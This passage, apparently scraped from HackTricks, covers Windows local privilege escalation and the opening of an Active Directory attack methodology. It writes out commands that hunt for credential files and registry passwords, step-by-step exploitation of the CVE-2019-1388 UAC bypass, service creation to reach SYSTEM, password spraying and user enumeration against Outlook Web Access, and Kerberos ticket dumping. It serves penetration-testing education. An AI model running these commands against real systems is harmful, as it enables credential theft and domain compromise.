Data\"\n#Chrome\nCookies\n#Chrome\nBookmarks\n#Chrome\nHistory\n#Chrome\nTypedURLsTime\n#IE\nTypedURLs\n#IE\n%SYSTEMDRIVE%\n\\\npagefile.sys\n%WINDIR%\n\\\ndebug\n\\\nNetSetup.log\n%WINDIR%\n\\\nrepair\n\\\nsam\n%WINDIR%\n\\\nrepair\n\\\nsystem\n%WINDIR%\n\\\nrepair\n\\\nsoftware, %WINDIR%\n\\\nrepair\n\\\nsecurity\n%WINDIR%\n\\\niis6.log\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\nAppEvent.Evt\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\nSecEvent.Evt\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\ndefault.sav\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\nsecurity.sav\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\nsoftware.sav\n%WINDIR%\n\\\nsystem32\n\\\nconfig\n\\\nsystem.sav\n%WINDIR%\n\\\nsystem32\n\\\nCCM\n\\\nlogs\n\\\n*.log\n%USERPROFILE%\n\\\nntuser.dat\n%USERPROFILE%\n\\\nLocalS~1\n\\\nTempor~1\n\\\nContent.IE5\n\\\nindex.dat\nSearch all of the proposed files:\ncd C:\\\ndir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v \".dll\"\nGet-Childitem ‚ÄìPath C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \"*.xml\" -or $_.Name -like \"*.txt\" -or $_.Name -like \"*.ini\")}\nCredentials in the RecycleBin\nYou should also check the Bin to look for credentials inside it\nTo\nrecover passwords\nsaved by several programs you can use:\nhttp://www.nirsoft.net/password_recovery_tools.html\n‚Äã\nInside the registry\nOther possible registry keys with credentials\nreg query\n\"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query\n\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\"\n/s\nreg query\n\"HKCU\\Software\\TightVNC\\Server\"\nreg query\n\"HKCU\\Software\\OpenSSH\\Agent\\Key\"\n‚Äã\nExtract openssh keys from registry.\n‚Äã\nBrowsers History\nYou should check for dbs where passwords from\nChrome or Firefox\nare stored.\nAlso check for the history, bookmarks and favourites of the browsers so maybe some\npasswords are\nstored there.\nTools to extract passwords from browsers:\nMimikatz:\ndpapi::chrome\n‚Äã\nSharpWeb\n‚Äã\n‚Äã\nSharpChromium\n‚Äã\n‚Äã\nSharpDPAPI\n****\nCOM DLL Overwriting\nComponent Object Model (COM)\nis a technology built within the Windows operating system that allows\nintercommunication\nbetween software components of different languages. Each COM component is\nidentified via a class ID (CLSID)\nand each component exposes functionality via one or more interfaces, identified via interface IDs (IIDs).\nCOM classes and interfaces are defined in the registry under\nHKEY_\nCLASSES_\nROOT\\CLSID\nand\nHKEY_\nCLASSES_\nROOT\\Interface\nrespectively. This registry is created by merging the\nHKEY_\nLOCAL_\nMACHINE\\Software\\Classes\n+\nHKEY_\nCURRENT_\nUSER\\Software\\Classes\n=\nHKEY_\nCLASSES_\nROOT.\nInside the CLSIDs of this registry you can find the child registry\nInProcServer32\nwhich contains a\ndefault value\npointing to a\nDLL\nand a value called\nThreadingModel\nthat can be\nApartment\n(Single-Threaded),\nFree\n(Multi-Threaded),\nBoth\n(Single or Multi) or\nNeutral\n(Thread Neutral).\nBasically, if you can\noverwrite any of the DLLs\nthat are going to be executed, you could\nescalate privileges\nif that DLL is going to be executed by a different user.\nTo learn how attackers use COM Hijacking as a persistence mechanism check:\nCOM Hijacking\nGeneric Password search in files and registry\nSearch for file contents\ncd\nC:\n\\\n&\nfindstr /SI /M\n\"password\"\n*.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config\nfindstr /spin\n\"password\"\n*.*\nSearch for a file with a certain filename\ndir\n/S /B *pass*.txt\n==\n*pass*.xml\n==\n*pass*.ini\n==\n*cred*\n==\n*vnc*\n==\n*.config*\nwhere /R C:\n\\\nuser.txt\nwhere /R C:\n\\\n*.ini\nSearch the registry for key names and passwords\nREG QUERY HKLM /F\n\"password\"\n/t REG_SZ /S /K\nREG QUERY HKCU /F\n\"password\"\n/t REG_SZ /S /K\nREG QUERY HKLM /F\n\"password\"\n/t REG_SZ /S /d\nREG QUERY HKCU /F\n\"password\"\n/t REG_SZ /S /d\nTools that search for passwords\n‚Äã\nMSF-Credentials Plugin\nis a msf\nplugin I have created this plugin to\nautomatically execute every metasploit POST module that searches for credentials\ninside the victim.\nWinpeas\nautomatically search for all the files containing passwords mentioned in this page.\nLazagne\nis another great tool to extract password from a system.\nThe tool\nSessionGopher\nsearch for\nsessions\n,\nusernames\nand\npasswords\nof several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)\nImport-Module path\n\\\nto\n\\\nSessionGopher.ps1\n;\nInvoke-SessionGopher\n-Thorough\nInvoke-SessionGopher\n-AllDomain\n-o\nInvoke-SessionGopher\n-AllDomain\n-u\ndomain.com\n\\\nadm-arvanaghi\n-p\ns3cr3tP@ss\nLeaked Handlers\nImagine that\na process running as SYSTEM open a new process\n(\nOpenProcess()\n) with\nfull access\n. The same process\nalso create a new process\n(\nCreateProcess()\n)\nwith low privileges but inheriting all the open handles of the main process\n.\nThen, if you have\nfull access to the low privileged process\n, you can grab the\nopen handle to the privileged process created\nwith\nOpenProcess()\nand\ninject a shellcode\n.\nRead this example for more information about\nhow to detect and exploit this vulnerability\n.\nRead this\nother post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)\n.\nNamed Pipe Client Impersonation\nA\npipe\nis a block of shared memory that processes can use for communication and data exchange.\nNamed Pipes\nis a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as\na named pipe server\nand a named\npipe client\nexist.\nWhen a\nclient writes on a pipe\n, the\nserver\nthat created the pipe can\nimpersonate\nthe\nclient\nif it has\nSeImpersonate\nprivileges. Then, if you can find a\nprivileged process that is going to write on any pipe that you can impersonate\n, you could be able to\nescalate privileges\nimpersonating that process after it writes inside your created pipe.\nYou can read this to learn how to perform this attack\nor\nthis\n.\nAlso the following tool allows to intercept a named pipe communication with a tool like burp:\nhttps://github.com/gabriel-sztejnworcel/pipe-intercept\nand this tool allows to list and see all the pipes to find privescs\nhttps://github.com/cyberark/PipeViewer\n****\nMisc\nMonitoring Command Lines for passwords\nWhen getting a shell as a user, there may be scheduled tasks or other processes being executed which\npass credentials on the command line\n. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.\nwhile\n(\n$true\n)\n{\n$process\n=\nGet-WmiObject\nWin32_Process\n|\nSelect-Object\nCommandLine\nStart-Sleep\n1\n$process2\n=\nGet-WmiObject\nWin32_Process\n|\nSelect-Object\nCommandLine\nCompare-Object\n-\nReferenceObject\n$process\n-\nDifferenceObject\n$process2\n}\nFrom Low Priv User to NT\\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass\nIf you have access to the graphical interface (via console or RDP) and UAC is enabled, in some versions of Microsoft Windows it's possible to run a terminal or any other process such as \"NT\\AUTHORITY SYSTEM\" from an unprivileged user.\nThis makes it possible to escalate privileges and bypass UAC at the same time with the same vulnerability. Additionally, there is no need to install anything and the binary used during the process, is signed and issued by Microsoft.\nSome of the affected systems are the following:\nSERVER\n======\n‚Äã\nWindows 2008r2\t7601\t** link OPENED AS SYSTEM **\nWindows 2012r2\t9600\t** link OPENED AS SYSTEM **\nWindows 2016\t14393\t** link OPENED AS SYSTEM **\nWindows 2019\t17763\tlink NOT opened\n‚Äã\n‚Äã\nWORKSTATION\n===========\n‚Äã\nWindows 7 SP1\t7601\t** link OPENED AS SYSTEM **\nWindows 8\t\t9200\t** link OPENED AS SYSTEM **\nWindows 8.1\t\t9600\t** link OPENED AS SYSTEM **\nWindows 10 1511\t10240\t** link OPENED AS SYSTEM **\nWindows 10 1607\t14393\t** link OPENED AS SYSTEM **\nWindows 10 1703\t15063\tlink NOT opened\nWindows 10 1709\t16299\tlink NOT opened\nTo exploit this vulnerability, it's necessary to perform the following steps:\n1) Right click on the HHUPD.EXE file and run it as Administrator.\n‚Äã\n2) When the UAC prompt appears, select \"Show more details\".\n‚Äã\n3) Click \"Show publisher certificate information\".\n‚Äã\n4) If the system is vulnerable, when clicking on the \"Issued by\" URL link, the default web browser may appear.\n‚Äã\n5) Wait for the site to load completely and select \"Save as\" to bring up an explorer.exe window.\n‚Äã\n6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.\n‚Äã\n7) You now will have an \"NT\\AUTHORITY SYSTEM\" command prompt.\n‚Äã\n8) Remember to cancel setup and the UAC prompt to return to your desktop.\nYou have all the necessary files and information in the following GitHub repository:\nhttps://github.com/jas502n/CVE-2019-1388\nFrom Administrator Medium to High Integrity Level / UAC Bypass\nRead this to\nlearn about Integrity Levels\n:\nIntegrity Levels\nThen\nread this to learn about UAC and UAC bypasses:\nUAC - User Account Control\nFrom High Integrity to System\nNew service\nIf you are already running on a High Integrity process, the\npass to SYSTEM\ncan be easy just\ncreating and executing a new service\n:\nsc create newservicename binPath= \"C:\\windows\\system32\\notepad.exe\"\nsc start newservicename\nAlwaysInstallElevated\nFrom a High Integrity process you could try to\nenable the AlwaysInstallElevated registry entries\nand\ninstall\na reverse shell using a\n.msi\nwrapper.\nMore information about the registry keys involved and how to install a\n.msi\npackage here.\n‚Äã\nHigh + SeImpersonate privilege to System\nYou can\nfind the code here\n.\nFrom SeDebug + SeImpersonate to Full Token privileges\nIf you have those token privileges (probably you will find this in an already High Integrity process), you will be able to\nopen almost any process\n(not protected processes) with the SeDebug privilege,\ncopy the token\nof the process, and create an\narbitrary process with that token\n.\nUsing this technique is usually\nselected any process running as SYSTEM with all the token privileges\n(\nyes, you can find SYSTEM processes without all the token privileges\n).\nYou can find an\nexample of code executing the proposed technique here\n.\nNamed Pipes\nThis technique is used by meterpreter to escalate in\ngetsystem\n. The technique consists on\ncreating a pipe and then create/abuse a service to write on that pipe\n. Then, the\nserver\nthat created the pipe using the\nSeImpersonate\nprivilege will be able to\nimpersonate the token\nof the pipe client (the service) obtaining SYSTEM privileges.\nIf you want to\nlearn more about name pipes you should read this\n.\nIf you want to read an example of\nhow to go from high integrity to System using name pipes you should read this\n.\nDll Hijacking\nIf you manages to\nhijack a dll\nbeing\nloaded\nby a\nprocess\nrunning as\nSYSTEM\nyou will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far\nmore easy to achieve from a high integrity process\nas it will have\nwrite permissions\non the folders used to load dlls.\nYou can\nlearn more about Dll hijacking here\n.\nFrom Administrator or Network Service to System\nGitHub - sailay1996/RpcSsImpersonator: Privilege Escalation Via RpcSs svc\nGitHub\nFrom LOCAL SERVICE or NETWORK SERVICE to full privs\nRead:\nhttps://github.com/itm4n/FullPowers\n‚Äã\nMore help\n‚Äã\nStatic impacket binaries\n‚Äã\nUseful tools\nBest tool to look for Windows local privilege escalation vectors:\nWinPEAS\n‚Äã\nPS\n‚Äã\nPrivescCheck\nPowerSploit-Privesc(PowerUP)\n-- Check for misconfigurations and sensitive files (\ncheck here\n). Detected.\nJAWS\n-- Check for some possible misconfigurations and gather info (\ncheck here\n).\nprivesc\n-- Check for misconfigurations\nSessionGopher\n-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.\nInvoke-WCMDump\n-- Extracts crendentials from Credential Manager. Detected.\nDomainPasswordSpray\n-- Spray gathered passwords across domain\nInveigh\n-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.\nWindowsEnum\n-- Basic privesc Windows enumeration\nSherlock\n~~\n~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\nWINspect\n-- Local checks\n(Need Admin rights)\nExe\n‚Äã\nWatson\n-- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) (\nprecompiled\n)\nSeatBelt\n-- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled)\n(\nprecompiled\n)\nLaZagne\n-- Extracts credentials from lots of softwares (precompiled exe in github)\nSharpUP\n-- Port of PowerUp to C#\nBeroot\n~~\n~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\nWindows-Privesc-Check\n-- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.\nBat\n‚Äã\nwinPEASbat\n-- Tool created based in this post (it does not need accesschk to work properly but it can use it).\nLocal\n‚Äã\nWindows-Exploit-Suggester\n-- Reads the output of\nsysteminfo\nand recommends working exploits (local python)\nWindows Exploit Suggester Next Generation\n-- Reads the output of\nsysteminfo\nandrecommends working exploits (local python)\nMeterpreter\nmulti/recon/local_exploit_suggestor\nYou have to compile the project using the correct version of .NET (\nsee this\n). To see the installed version of .NET on the victim host you can do:\nC:\\Windows\\microsoft.net\\framework\\v4.0.30319\\MSBuild.exe -version #Compile the code with the version given in \"Build Engine version\" line\nBibliography\n‚Äã\nhttp://www.fuzzysecurity.com/tutorials/16.html\nhttp://www.greyhathacker.net/?p=738\nhttp://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\nhttps://github.com/sagishahar/lpeworkshop\nhttps://www.youtube.com/watch?v=_8xJaaQlpBo\nhttps://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\nhttps://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nhttps://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md\nhttps://github.com/frizb/Windows-Privilege-Escalation\nhttps://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\nhttps://github.com/frizb/Windows-Privilege-Escalation\nhttp://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nWindows Hardening -\nPrevious\nChecklist - Local Windows Privilege Escalation\nNext\nAbusing Tokens\nLast modified\n6mo ago"
    },
    {
        "title": "Active Directory Methodology",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
        "text": "Active Directory Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic overview\nActive Directory allows network administrators to create and manage domains, users, and objects within a network. For example, an admin can create a group of users and give them specific access privileges to certain directories on the server. As a network grows, Active Directory provides a way to organize a large number of users into logical groups and subgroups, while providing access control at each level.\nThe Active Directory structure includes three main tiers: 1) domains, 2) trees, and 3) forests. Several objects (users or devices) that all use the same database may be grouped in to a single domain. Multiple domains can be combined into a single group called a tree. Multiple trees may be grouped into a collection called a forest. Each one of these levels can be assigned specific access rights and communication privileges.\nMain concepts of an Active Directory:\n1.\nDirectory\n‚Äì Contains all the information about the objects of the Active directory\n2.\nObject\n‚Äì An object references almost anything inside the directory (a user, group, shared folder...)\n3.\nDomain\n‚Äì The objects of the directory are contained inside the domain. Inside a \"forest\" more than one domain can exist and each of them will have their own objects collection.\n4.\nTree\n‚Äì Group of domains with the same root. Example:\ndom.local, email.dom.local, www.dom.local\n5.\nForest\n‚Äì The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.\nActive Directory provides several different services, which fall under the umbrella of \"Active Directory Domain Services,\" or AD DS. These services include:\n1.\nDomain Services\n‚Äì stores centralized data and manages communication between users and domains; includes login authentication and search functionality\n2.\nCertificate Services\n‚Äì creates, distributes, and manages secure certificates\n3.\nLightweight Directory Services\n‚Äì supports directory-enabled applications using the open (LDAP) protocol\n4.\nDirectory Federation Services\n‚Äì provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session\n5.\nRights Management\n‚Äì protects copyrighted information by preventing unauthorized use and distribution of digital content\n6.\nDNS Service\n‚Äì Used to resolve domain names.\nAD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials.\nFrom:\nhttps://techterms.com/definition/active_directory\n‚Äã\nKerberos Authentication\nTo learn how to\nattack an AD\nyou need to\nunderstand\nreally good the\nKerberos authentication process\n.\nRead this page if you still don't know how it works.\n‚Äã\nCheat Sheet\nYou can take a lot to\nhttps://wadcoms.github.io/\nto have a quick view of which commands you can run to enumerate/exploit an AD.\nRecon Active Directory (No creds/sessions)\nIf you just have access to an AD environment but you don't have any credentials/sessions you could:\nPentest the network:\nScan the network, find machines and open ports and try to\nexploit vulnerabilities\nor\nextract credentials\nfrom them (for example,\nprinters could be very interesting targets\n.\nEnumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.\ngobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt\nTake a look to the General\nPentesting Methodology\nto find more information about how to do this.\nCheck for null and Guest access on smb services\n(this won't work on modern Windows versions):\nenum4linux -a -u \"\" -p \"\" <DC IP> && enum4linux -a -u \"guest\" -p \"\" <DC IP>\nsmbmap -u \"\" -p \"\" -P 445 -H <DC IP> && smbmap -u \"guest\" -p \"\" -P 445 -H <DC IP>\nsmbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //\nA more detailed guide on how to enumerate a SMB server can be found here:\n139,445 - Pentesting SMB\nEnumerate Ldap\nnmap -n -sV --script \"ldap* and not brute\" -p 389 <DC IP>\nA more detailed guide on how to enumerate LDAP can be found here (pay\nspecial attention to the anonymous access\n):\n389, 636, 3268, 3269 - Pentesting LDAP\nPoison the network\nGather credentials\nimpersonating services with Responder\n‚Äã\nAccess host by\nabusing the relay attack\n‚Äã\nGather credentials\nexposing\nfake UPnP services with evil-S\n‚Äã\nSDP\n‚Äã\n‚Äã\nOSINT\n:\nExtract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.\nIf you find the complete names of company workers, you could try different AD\nusername conventions (\nread this\n). The most common conventions are:\nNameSurname\n,\nName.Surname\n,\nNamSur\n(3letters of each),\nNam.Sur\n,\nNSurname\n,\nN.Surname\n,\nSurnameName\n,\nSurname.Name\n,\nSurnameN\n,\nSurname.N\n, 3\nrandom letters and 3 random numbers\n(abc123).\nTools:\n‚Äã\nw0Tx/generate-ad-username\n‚Äã\n‚Äã\nurbanadventurer/username-anarchy\n‚Äã\nUser enumeration\nAnonymous SMB/LDAP enum:\nCheck the\npentesting SMB\nand\npentesting LDAP\npages.\nKerbrute enum\n: When an\ninvalid username is requested\nthe server will respond using the\nKerberos error\ncode\nKRB5KDC_ERR_C_PRINCIPAL_UNKNOWN\n, allowing us to determine that the username was invalid.\nValid usernames\nwill illicit either the\nTGT in a AS-REP\nresponse or the error\nKRB5KDC_ERR_PREAUTH_REQUIRED\n, indicating that the user is required to perform pre-authentication.\n./kerbrute_linux_amd64 userenum\n-d\nlab.ropnop.com\n--dc\n10.10\n.10.10 usernames.txt\n#From https://github.com/ropnop/kerbrute/releases\n‚Äã\nnmap\n-p\n88\n--script\n=\nkrb5-enum-users --script-args\n=\n\"krb5-enum-users.realm='DOMAIN'\"\n<\nIP\n>\nNmap\n-p\n88\n--script\n=\nkrb5-enum-users --script-args krb5-enum-users.realm\n=\n'<domain>'\n,userdb\n=\n/root/Desktop/usernames.txt\n<\nIP\n>\n‚Äã\nmsf\n>\nuse auxiliary/gather/kerberos_enumusers\n‚Äã\ncrackmapexec smb dominio.es\n-u\n''\n-p\n''\n--users\n|\nawk\n'{print $4}'\n|\nuniq\nOWA (Outlook Web Access) Server\nIf you found one of these servers in the network you can also perform\nuser enumeration against it\n. For example, you could use the tool\nMailSniper\n:\nipmo C:\n\\\nTools\n\\\nMailSniper\n\\\nMailSniper.ps1\n# Get info about the domain\nInvoke-DomainHarvestOWA\n-ExchHostname\n[\nip\n]\n# Enumerate valid users from a list of potential usernames\nInvoke-UsernameHarvestOWA\n-ExchHostname\n[\nip\n]\n-Domain\n[\ndomain\n]\n-UserList\n.\n\\\npossible-usernames.txt\n-OutFile\nvalid.txt\n# Password spraying\nInvoke-PasswordSprayOWA\n-ExchHostname\n[\nip\n]\n-UserList\n.\n\\\nvalid.txt\n-Password\nSummer2021\n# Get addresses list from the compromised mail\nGet-GlobalAddressList\n-ExchHostname\n[\nip\n]\n-UserName\n[\ndomain\n]\\[\nusername\n]\n-Password\nSummer2021\n-OutFile\ngal.txt\nYou can find lists of usernames in\nthis github repo\n**** and this one (\nstatistically-likely-usernames\n).\nHowever, you should have the\nname of the people working on the company\nfrom the recon step you should have performed before this. With the name and surname you could used the script\nnamemash.py\nto generate potential valid usernames.\nKnowing one or several usernames\nOk, so you know you have already a valid username but no passwords... Then try:\n‚Äã\nASREPRoast\n: If a user\ndoesn't have\nthe attribute\nDONT_REQ_PREAUTH\nyou can\nrequest a AS_REP message\nfor that user that will contain some data encrypted by a derivation of the password of the user.\n‚Äã\nPassword Spraying\n: Let's try the most\ncommon passwords\nwith each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).\nNote that you can also\nspray OWA servers\nto try to get access to the users mail servers.\nPassword Spraying\nLLMNR/NBT-NS Poisoning\nYou might be able to\nobtain\nsome challenge\nhashes\nto crack\npoisoning\nsome protocols of the\nnetwork\n:\nSpoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks\nNTML Relay\nIf you have managed to enumerate the active directory you will have\nmore emails and a better understanding of the network\n. You might be able to to force NTML\nrelay attacks\n**** to get access to the AD env.\nSteal NTLM Creds\nIf you can\naccess other PCs or shares\nwith the\nnull or guest user\nyou could\nplace files\n(like a SCF file) that if somehow accessed will t\nrigger an NTML authentication against you\nso you can\nsteal\nthe\nNTLM challenge\nto crack it:\nPlaces to steal NTLM creds\nEnumerating Active Directory WITH credentials/session\nFor this phase you need to have\ncompromised the credentials or a session of a valid domain account.\nIf you have some valid credentials or a shell as a domain user,\nyou should remember that the options given before are still options to compromise other users\n.\nBefore start the authenticated enumeration you should know what is the\nKerberos double hop problem.\nKerberos Double Hop Problem\nEnumeration\nHaving compromised an account is a\nbig step to start compromising the whole domain\n, because you are going to be able to start the\nActive Directory Enumeration:\nRegarding\nASREPRoast\nyou can now find every possible vulnerable user, and regarding\nPassword Spraying\nyou can get a\nlist of all the usernames\nand try the password of the compromised account, empty passwords and new promising passwords.\nYou could use the\nCMD to perform a basic recon\n‚Äã\nYou can also use\npowershell for recon\nwhich will be stealthier\nYou ca also\nuse powerview\nto extract more detailed information\nAnother amazing tool for recon in an active directory is\nBloodHound\n. It is\nnot very stealthy\n(depending on the collection methods you use), but\nif you don't care\nabout that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.\nOther automated AD enumeration tools are:\nAD Explorer\n,\nADRecon\n,\nGroup3r\n,\nPingCastle\n.\n****\nDNS records of the AD\n**** as they might contain interesting information.\nA\ntool with GUI\nthat you can use to enumerate the directory is\nAdExplorer.exe\nfrom\nSysInternal\nSuite.\nYou can also search in the LDAP database with\nldapsearch\nto look for credentials in fields\nuserPassword\n&\nunixUserPassword\n, or even for\nDescription\n. cf.\nPassword in AD User comment on PayloadsAllTheThings\nfor other methods.\nIf you are using\nLinux\n, you could also enumerate the domain using\npywerview\n.\nYou could also try automated tools as:\n‚Äã\ntomcarver16/ADSearch\n‚Äã\n‚Äã\n61106960/adPEAS\n‚Äã\nExtracting all domain users\nIt's very easy to obtain all the domain usernames from Windows (\nnet user /domain\n,\nGet-DomainUser\nor\nwmic useraccount get name,sid\n). In Linux, you can use:\nGetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username\nor\nenum4linux -a -u \"user\" -p \"password\" <DC IP>\nEven if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.\nKerberoast\nThe goal of Kerberoasting is to harvest\nTGS tickets for services that run on behalf of domain user accounts\n. Part of these TGS tickets are\nencrypted wit keys derived from user passwords\n. As a consequence, their credentials could be\ncracked offline\n.\nMore about this in:\nKerberoast\nRemote connexion (RDP, SSH, FTP, Win-RM, etc)\nOnce you have obtained some credentials you could check if you have access to any\nmachine\n. For that matter, you could use\nCrackMapExec\nto attempt connecting on several servers with different protocols, accordingly to your ports scans.\nLocal Privilege Escalation\nIf you have compromised credentials or a session as a regular domain user and you have\naccess\nwith this user to\nany machine in the domain\nyou should try to find your way to\nescalate privileges locally and looting for credentials\n. This is because only with local administrator privileges you will be able to\ndump hashes of other users\nin memory (LSASS) and locally (SAM).\nThere is a complete page in this book about\nlocal privilege escalation in Windows\nand a\nchecklist\n. Also, don't forget to use\nWinPEAS\n.\nCurrent Session Tickets\nIt's very\nunlikely\nthat you will find\ntickets\nin the current user\ngiving you permission to access\nunexpected resources, but you could check:\n## List all tickets (if not admin, only current user tickets)\n.\n\\\nRubeus.exe triage\n## Dump the interesting one by luid\n.\n\\\nRubeus.exe dump /service:krbtgt /luid:\n<\nluid\n>\n/nowrap\n[\nIO.File\n]\n::WriteAllBytes\n(\n\"ticket.kirbi\"\n,\n[\nConvert\n]\n::FromBase64String\n(\n\"<BASE64_TICKET>\"\n))\nNTML Relay\nIf you have managed to enumerate the active directory you will have\nmore emails and a better understanding of the network\n. You might be able to to force NTML\nrelay attacks\n.\nLooks for Creds in Computer Shares\nNow that you have some basic credentials you should check if you can\nfind\nany\ninteresting files being shared inside the AD\n. You could do that manually but it's a very boring repetitive task (and more if you find hundreds of docs you need to check).\n‚Äã\nFollow this link to learn about tools you could use.\n‚Äã\nSteal NTLM Creds\nIf you can\naccess other PCs or shares\nyou could\nplace files\n(like a SCF file) that if somehow accessed will t\nrigger an NTML authentication against you\nso you can\nsteal\nthe\nNTLM challenge\nto crack it:\nPlaces to steal NTLM creds\nCVE-2021-1675/CVE-2021-34527 PrintNightmare\nThis vulnerability allowed any authenticated user to\ncompromise the domain controller\n.\nPrintNightmare\nPrivilege escalation on Active Directory WITH privileged credentials/session\nFor the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.\nHash extraction\nHopefully you have managed to\ncompromise some local admin\naccount using\nAsRepRoast\n,\nPassword Spraying\n,\nKerberoast\n,\nResponder\nincluding relaying,\nEvilSSDP\n,\nescalating privileges locally\n.\nThen, its time to dump all the hashes in memory and locally.\nRead this page about different ways to obtain the hashes.\n‚Äã\nPass the Hash\nOnce you have the hash of a user\n, you can use it to\nimpersonate\nit.\nYou need to use some\ntool\nthat will\nperform\nthe\nNTLM authentication using\nthat\nhash\n,\nor\nyou could create a new\nsessionlogon\nand\ninject\nthat\nhash\ninside the\nLSASS\n, so when any\nNTLM authentication is performed\n, that\nhash will be used.\nThe last option is what mimikatz does.\nRead this page for more information.\n‚Äã\nOver Pass the Hash/Pass the Key\nThis attack aims to\nuse the user NTLM hash to request Kerberos tickets\n, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially\nuseful in networks where NTLM protocol is disabled\nand only\nKerberos is allowed\nas authentication protocol.\nOver Pass the Hash/Pass the Key\nPass the Ticket\nThis attack is similar to Pass the Key, but instead of using hashes to request a ticket, 